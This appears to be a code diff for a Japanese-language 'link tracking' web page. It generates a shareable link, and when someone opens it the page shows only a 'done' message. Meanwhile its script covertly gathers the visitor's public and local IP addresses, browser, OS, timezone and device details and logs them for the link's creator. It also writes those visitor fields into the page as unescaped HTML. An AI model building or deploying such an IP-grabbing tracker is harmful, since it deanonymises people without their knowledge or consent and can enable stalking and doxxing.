@@ -21,7 +21,7 @@
             justify-content: center;
             padding: 20px;
             position: relative;
-            overflow: hidden;
+            overflow-x: hidden;
         }
         
         body::before {
@@ -49,54 +49,53 @@
             border-radius: 20px;
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.4);
             width: 100%;
-            max-width: 900px;
-            padding: 40px;
+            max-width: 1000px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 0, 0, 0.3);
             position: relative;
             z-index: 1;
-            border: 1px solid rgba(255, 0, 0, 0.3);
+            padding: 40px;
         }
         
-        h1 {
+        .header {
             text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .header h1 {
             font-size: 2.5rem;
-            margin-bottom: 30px;
+            margin-bottom: 10px;
             text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
         }
         
-        .link-section {
-            background: rgba(20, 0, 0, 0.8);
-            padding: 30px;
+        .header p {
+            color: #ff6666;
+            font-size: 1.1rem;
+        }
+        
+        .create-section {
+            background: rgba(20, 0, 0, 0.6);
             border-radius: 12px;
+            padding: 30px;
             margin-bottom: 30px;
             border: 1px solid rgba(255, 0, 0, 0.3);
         }
         
-        .link-display {
-            background: rgba(30, 0, 0, 0.9);
-            padding: 15px;
-            border-radius: 8px;
-            word-break: break-all;
-            font-family: 'Courier New', monospace;
-            margin-bottom: 15px;
-            border-left: 3px solid #dc143c;
-            min-height: 50px;
-            display: flex;
-            align-items: center;
-        }
-        
         .btn {
+            display: block;
             width: 100%;
-            padding: 15px;
+            padding: 18px;
             background: linear-gradient(135deg, #8b0000, #dc143c);
             color: white;
             border: none;
             border-radius: 10px;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
             box-shadow: 0 5px 20px rgba(220, 20, 60, 0.5);
+            border: 1px solid rgba(255, 0, 0, 0.4);
+            margin-bottom: 20px;
         }
         
         .btn:hover {
@@ -105,106 +104,118 @@
             background: linear-gradient(135deg, #a00000, #ff1744);
         }
         
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
+        .link-display {
+            background: rgba(30, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border-left: 3px solid #dc143c;
+            display: none;
+        }
+        
+        .link-url {
+            font-family: 'Courier New', monospace;
+            color: #ff8888;
+            word-break: break-all;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+        }
+        
+        .copy-btn {
+            padding: 12px 24px;
+            background: #b54343;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #dc143c;
+            transform: scale(1.05);
         }
         
         .visitors-section {
-            background: rgba(20, 0, 0, 0.8);
-            padding: 30px;
+            background: rgba(20, 0, 0, 0.6);
             border-radius: 12px;
+            padding: 30px;
             border: 1px solid rgba(255, 0, 0, 0.3);
+            display: none;
         }
         
-        .visitor-card {
-            background: rgba(30, 0, 0, 0.9);
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #ff6666;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .visitor-item {
+            background: rgba(30, 0, 0, 0.8);
             padding: 20px;
             border-radius: 8px;
             margin-bottom: 15px;
             border-left: 3px solid #dc143c;
-            animation: slideIn 0.5s ease;
             cursor: pointer;
             transition: all 0.3s ease;
         }
-
-        .visitor-card:hover {
-            background: rgba(40, 0, 0, 0.95);
+        
+        .visitor-item:hover {
+            background: rgba(40, 0, 0, 0.9);
             transform: translateX(5px);
-            border-left-color: #ff1744;
         }
-
+        
         .visitor-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .expand-icon {
-            font-size: 1.5rem;
-            transition: transform 0.3s ease;
-        }
-
-        .visitor-card.expanded .expand-icon {
-            transform: rotate(180deg);
-        }
-
-        .visitor-info {
-            display: none;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .visitor-card.expanded .visitor-info {
-            display: grid;
+            margin-bottom: 10px;
         }
         
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-        
-        .visitor-info {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            margin-top: 10px;
-        }
-        
-        .info-item {
-            padding: 10px;
-            background: rgba(40, 0, 0, 0.8);
-            border-radius: 5px;
-        }
-        
-        .info-label {
+        .visitor-time {
             color: #ff8888;
-            font-size: 0.85rem;
-            margin-bottom: 5px;
-            text-transform: uppercase;
+            font-size: 1.1rem;
+            font-weight: 600;
         }
         
-        .info-value {
+        .visitor-ip {
+            color: #b9bbbe;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .visitor-details {
+            display: none;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
+        .detail-row {
+            display: grid;
+            grid-template-columns: 150px 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .detail-label {
+            color: #ff8888;
+            font-weight: 600;
+        }
+        
+        .detail-value {
             color: #fff;
             font-family: 'Courier New', monospace;
-            word-break: break-all;
         }
         
-        .completed-message {
+        .completed-page {
             text-align: center;
-            padding: 100px 30px;
+            padding: 60px 20px;
         }
         
-        .completed-message h2 {
+        .completed-page h1 {
             font-size: 3rem;
             color: #ff3333;
             text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
@@ -216,293 +227,226 @@
             50% { transform: scale(1.05); }
         }
         
-        #visitor-page, #link-created-section {
+        .status-message {
+            background: rgba(181, 67, 67, 0.2);
+            border: 1px solid #b54343;
+            color: #ff8585;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
             display: none;
-        }
-        
-        .timestamp {
-            color: #888;
-            font-size: 0.9rem;
-            margin-bottom: 10px;
-        }
-
-        .start-section {
-            text-align: center;
-            padding: 50px 30px;
-            background: rgba(20, 0, 0, 0.8);
-            border-radius: 12px;
-            border: 1px solid rgba(255, 0, 0, 0.3);
-        }
-
-        .start-section h2 {
-            margin-bottom: 30px;
-            color: #ff6666;
         }
     </style>
 </head>
 <body>
-    <div class="container" id="creator-page">
-        <h1>🔗 リンクトラッキングシステム</h1>
-        
-        <div class="start-section" id="start-section">
-            <h2>リンクを作成して訪問者を追跡</h2>
-            <button class="btn" onclick="createLink()">🔗 自動作成</button>
-        </div>
-
-        <div id="link-created-section">
-            <div class="link-section">
-                <h2 style="margin-bottom: 20px; color: #ff6666;">生成されたリンク</h2>
-                <div class="link-display" id="generated-link"></div>
-                <button class="btn" onclick="copyLink()">📋 リンクをコピー</button>
+    <div class="container">
+        <div id="creator-view">
+            <div class="header">
+                <h1>リンクトラッキングシステム</h1>
+                <p>リンクを作成して訪問者の情報を追跡</p>
             </div>
             
-            <div class="visitors-section">
-                <h2 style="margin-bottom: 20px; color: #ff6666;">リンクを開いた人 (<span id="visitor-count">0</span>)</h2>
-                <div id="visitors-list">
-                    <p style="text-align: center; opacity: 0.5;">まだ誰も開いていません...</p>
+            <div class="create-section">
+                <button id="create-link-btn" class="btn">リンクを自動作成</button>
+                
+                <div id="link-display" class="link-display">
+                    <div class="link-url" id="generated-link"></div>
+                    <button id="copy-link-btn" class="copy-btn">リンクをコピー</button>
                 </div>
+                
+                <div id="status-message" class="status-message"></div>
+            </div>
+            
+            <div id="visitors-section" class="visitors-section">
+                <h2 class="section-title">🔍 開いた人</h2>
+                <div id="visitors-list"></div>
             </div>
         </div>
-    </div>
-    
-    <div class="container" id="visitor-page">
-        <div class="completed-message">
-            <h2>完了！</h2>
+        
+        <div id="visitor-view" style="display: none;">
+            <div class="completed-page">
+                <h1>完了！</h1>
+            </div>
         </div>
     </div>
 
     <script>
-        let myLinkId = null;
+        let linkId = null;
         let checkInterval = null;
-
-        const linkId = new URLSearchParams(window.location.search).get('id');
         
-        if (linkId) {
-            // 訪問者ページ
-            document.getElementById('creator-page').style.display = 'none';
-            document.getElementById('visitor-page').style.display = 'block';
+        // URLパラメータをチェック
+        const urlParams = new URLSearchParams(window.location.search);
+        const visitLinkId = urlParams.get('id');
+        
+        if (visitLinkId) {
+            // 訪問者ビュー
+            document.getElementById('creator-view').style.display = 'none';
+            document.getElementById('visitor-view').style.display = 'block';
             
-            // 訪問者情報を収集して保存
-            collectAndSendVisitorInfo(linkId);
-        }
-
-        async function createLink() {
-            myLinkId = generateLinkId();
-            const fullLink = `${window.location.origin}${window.location.pathname}?id=${myLinkId}`;
-            
-            document.getElementById('start-section').style.display = 'none';
-            document.getElementById('link-created-section').style.display = 'block';
-            document.getElementById('generated-link').textContent = fullLink;
-            
-            // 訪問者情報をチェック開始
-            checkForVisitors(myLinkId);
+            // 訪問者情報を送信
+            sendVisitorInfo(visitLinkId);
+        } else {
+            // 作成者ビュー
+            setupCreatorView();
         }
         
-        function generateLinkId() {
+        function setupCreatorView() {
+            document.getElementById('create-link-btn').addEventListener('click', createLink);
+            document.getElementById('copy-link-btn').addEventListener('click', copyLink);
+        }
+        
+        function createLink() {
+            linkId = generateId();
+            const link = `${window.location.origin}${window.location.pathname}?id=${linkId}`;
+            
+            document.getElementById('generated-link').textContent = link;
+            document.getElementById('link-display').style.display = 'block';
+            document.getElementById('visitors-section').style.display = 'block';
+            
+            showStatus('リンクが作成されました！');
+            
+            // 訪問者情報の定期チェック開始
+            if (checkInterval) clearInterval(checkInterval);
+            checkInterval = setInterval(() => loadVisitors(), 2000);
+        }
+        
+        function copyLink() {
+            const link = document.getElementById('generated-link').textContent;
+            navigator.clipboard.writeText(link).then(() => {
+                showStatus('リンクをコピーしました！');
+            });
+        }
+        
+        function generateId() {
             return 'link_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
         }
         
-        async function collectAndSendVisitorInfo(linkId) {
-            console.log('Starting to collect visitor info for:', linkId);
-            
-            // まず基本情報を取得
-            const info = {
-                linkId: linkId,
-                timestamp: new Date().toISOString(),
-                publicIp: '取得中...',
-                localIps: [],
-                userAgent: navigator.userAgent,
-                browser: getBrowser(),
-                os: getOS(),
-                screenResolution: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform,
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明',
-                connection: getConnectionInfo()
-            };
-
-            // IP情報を確実に取得してから保存
+        function showStatus(message) {
+            const statusEl = document.getElementById('status-message');
+            statusEl.textContent = message;
+            statusEl.style.display = 'block';
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 3000);
+        }
+        
+        async function sendVisitorInfo(linkId) {
             try {
-                // パブリックIPを取得（確実に取得するまで待つ）
-                console.log('Fetching public IP...');
-                info.publicIp = await getPublicIP();
-                console.log('Public IP obtained:', info.publicIp);
+                const publicIP = await getPublicIP();
+                const localIPs = await getLocalIPs();
                 
-                // ローカルIPを取得（5秒待つ）
-                console.log('Fetching local IPs...');
-                info.localIps = await getLocalIPs();
-                console.log('Local IPs obtained:', info.localIps);
+                const visitorData = {
+                    linkId: linkId,
+                    timestamp: new Date().toISOString(),
+                    publicIP: publicIP,
+                    localIPs: localIPs,
+                    userAgent: navigator.userAgent,
+                    browser: getBrowser(),
+                    os: getOS(),
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明',
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    platform: navigator.platform,
+                    connection: getConnectionInfo()
+                };
                 
-                // 既存の訪問者データを取得
-                const stored = await window.storage.get(`visitors_${linkId}`, true);
-                let visitors = [];
-                if (stored && stored.value) {
-                    try {
-                        visitors = JSON.parse(stored.value);
-                    } catch (e) {
-                        console.error('Error parsing existing visitors:', e);
-                        visitors = [];
-                    }
-                }
+                // LocalStorageに保存
+                const storageKey = `visitors_${linkId}`;
+                let visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                visitors.push(visitorData);
+                localStorage.setItem(storageKey, JSON.stringify(visitors));
                 
-                // 新しい訪問者を追加
-                visitors.push(info);
-                
-                // 保存
-                console.log('Saving visitor info:', info);
-                const saveResult = await window.storage.set(`visitors_${linkId}`, JSON.stringify(visitors), true);
-                console.log('Save result:', saveResult);
-                
-                // 保存確認
-                const verification = await window.storage.get(`visitors_${linkId}`, true);
-                console.log('Verification - data saved successfully:', verification);
+                console.log('訪問者情報を保存しました', visitorData);
                 
             } catch (error) {
-                console.error('Error in collectAndSendVisitorInfo:', error);
-                
-                // エラーが発生しても基本情報は保存する
-                try {
-                    const stored = await window.storage.get(`visitors_${linkId}`, true);
-                    let visitors = [];
-                    if (stored && stored.value) {
-                        visitors = JSON.parse(stored.value);
-                    }
-                    visitors.push(info);
-                    await window.storage.set(`visitors_${linkId}`, JSON.stringify(visitors), true);
-                } catch (fallbackError) {
-                    console.error('Fallback save also failed:', fallbackError);
-                }
+                console.error('情報送信エラー:', error);
             }
         }
         
-        async function checkForVisitors(linkId) {
-            // 既存のインターバルをクリア
-            if (checkInterval) {
-                clearInterval(checkInterval);
-            }
+        function loadVisitors() {
+            if (!linkId) return;
             
-            // 即座に1回チェック
-            await updateVisitorsList(linkId);
+            const storageKey = `visitors_${linkId}`;
+            const visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
             
-            // 定期的にチェック（1秒ごと）
-            checkInterval = setInterval(async () => {
-                await updateVisitorsList(linkId);
-            }, 1000);
-        }
-
-        async function updateVisitorsList(linkId) {
-            try {
-                const stored = await window.storage.get(`visitors_${linkId}`, true);
-                if (stored && stored.value) {
-                    try {
-                        const visitors = JSON.parse(stored.value);
-                        if (visitors && visitors.length > 0) {
-                            displayVisitors(visitors);
-                        }
-                    } catch (e) {
-                        console.error('Error parsing visitors:', e);
-                    }
-                }
-            } catch (error) {
-                console.error('Error checking visitors:', error);
-            }
-        }
-        
-        function displayVisitors(visitors) {
-            const container = document.getElementById('visitors-list');
-            const countElement = document.getElementById('visitor-count');
+            const listEl = document.getElementById('visitors-list');
+            listEl.innerHTML = '';
             
-            if (!visitors || visitors.length === 0) {
-                container.innerHTML = '<p style="text-align: center; opacity: 0.5;">まだ誰も開いていません...</p>';
-                countElement.textContent = '0';
+            if (visitors.length === 0) {
+                listEl.innerHTML = '<p style="color: #888; text-align: center;">まだ訪問者がいません</p>';
                 return;
             }
-
-            countElement.textContent = visitors.length;
             
-            // 既存のカードの展開状態を保存
-            const expandedCards = new Set();
-            container.querySelectorAll('.visitor-card.expanded').forEach(card => {
-                const index = card.getAttribute('data-index');
-                if (index) expandedCards.add(index);
-            });
-            
-            container.innerHTML = '';
-            visitors.forEach((visitor, index) => {
-                const card = document.createElement('div');
-                card.className = 'visitor-card';
-                card.setAttribute('data-index', index);
+            visitors.reverse().forEach((visitor, index) => {
+                const item = document.createElement('div');
+                item.className = 'visitor-item';
                 
-                // 以前展開されていた場合は展開状態を維持
-                if (expandedCards.has(String(index))) {
-                    card.classList.add('expanded');
-                }
+                const time = new Date(visitor.timestamp).toLocaleString('ja-JP');
                 
-                const timestamp = new Date(visitor.timestamp).toLocaleString('ja-JP');
-                
-                card.innerHTML = `
+                item.innerHTML = `
                     <div class="visitor-header">
-                        <h3 style="color: #ff3333;">開いた人 #${index + 1}</h3>
-                        <div style="display: flex; align-items: center; gap: 15px;">
-                            <div class="timestamp">${timestamp}</div>
-                            <div class="expand-icon">▼</div>
-                        </div>
+                        <div class="visitor-time">訪問者 #${visitors.length - index}</div>
+                        <div class="visitor-ip">${visitor.publicIP}</div>
                     </div>
-                    <div class="visitor-info">
-                        <div class="info-item">
-                            <div class="info-label">パブリックIP</div>
-                            <div class="info-value">${visitor.publicIp || '取得中...'}</div>
+                    <div class="visitor-details" id="details-${index}">
+                        <div class="detail-row">
+                            <div class="detail-label">訪問時刻:</div>
+                            <div class="detail-value">${time}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">ローカルIP</div>
-                            <div class="info-value">${visitor.localIps && visitor.localIps.length > 0 ? visitor.localIps.join(', ') : '取得中...'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">パブリックIP:</div>
+                            <div class="detail-value">${visitor.publicIP}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">ブラウザ</div>
-                            <div class="info-value">${visitor.browser || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">ローカルIP:</div>
+                            <div class="detail-value">${visitor.localIPs.length > 0 ? visitor.localIPs.join(', ') : '取得失敗'}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">OS</div>
-                            <div class="info-value">${visitor.os || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">OS:</div>
+                            <div class="detail-value">${visitor.os}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">解像度</div>
-                            <div class="info-value">${visitor.screenResolution || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">ブラウザ:</div>
+                            <div class="detail-value">${visitor.browser}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">言語</div>
-                            <div class="info-value">${visitor.language || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">画面解像度:</div>
+                            <div class="detail-value">${visitor.screenResolution}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">タイムゾーン</div>
-                            <div class="info-value">${visitor.timezone || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">メモリ:</div>
+                            <div class="detail-value">${visitor.deviceMemory}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">プラットフォーム</div>
-                            <div class="info-value">${visitor.platform || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">言語:</div>
+                            <div class="detail-value">${visitor.language}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">メモリ</div>
-                            <div class="info-value">${visitor.memory || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">タイムゾーン:</div>
+                            <div class="detail-value">${visitor.timezone}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="info-label">接続情報</div>
-                            <div class="info-value">${visitor.connection || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">プラットフォーム:</div>
+                            <div class="detail-value">${visitor.platform}</div>
                         </div>
-                        <div class="info-item" style="grid-column: 1 / -1;">
-                            <div class="info-label">ユーザーエージェント</div>
-                            <div class="info-value" style="font-size: 0.85rem;">${visitor.userAgent || '不明'}</div>
+                        <div class="detail-row">
+                            <div class="detail-label">接続情報:</div>
+                            <div class="detail-value">${visitor.connection || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">ユーザーエージェント:</div>
+                            <div class="detail-value">${visitor.userAgent}</div>
                         </div>
                     </div>
                 `;
                 
-                // カードをクリックして展開/折りたたみ
-                card.addEventListener('click', function() {
-                    this.classList.toggle('expanded');
+                item.addEventListener('click', () => {
+                    const details = document.getElementById(`details-${index}`);
+                    details.style.display = details.style.display === 'block' ? 'none' : 'block';
                 });
                 
-                container.appendChild(card);
+                listEl.appendChild(item);
             });
         }
         
@@ -512,7 +456,7 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                return "取得失敗";
+                return '取得失敗';
             }
         }
         
@@ -569,22 +513,9 @@
         
         function getConnectionInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return "不明";
-            return `${conn.effectiveType || '不明'} (${conn.type || '不明'})`;
-        }
-        
-        function copyLink() {
-            const link = document.getElementById('generated-link').textContent;
-            navigator.clipboard.writeText(link).then(() => {
-                const btn = event.target;
-                const originalText = btn.textContent;
-                btn.textContent = '✅ コピーしました！';
-                btn.style.background = 'linear-gradient(135deg, #006400, #228B22)';
-                setTimeout(() => {
-                    btn.textContent = originalText;
-                    btn.style.background = '';
-                }, 2000);
-            });
+            if (!conn) return '不明';
+            
+            return `${conn.effectiveType || '不明'} (下り: ${conn.downlink || '不明'} Mbps, RTT: ${conn.rtt || '不明'} ms)`;
         }
     </script>
 </body>
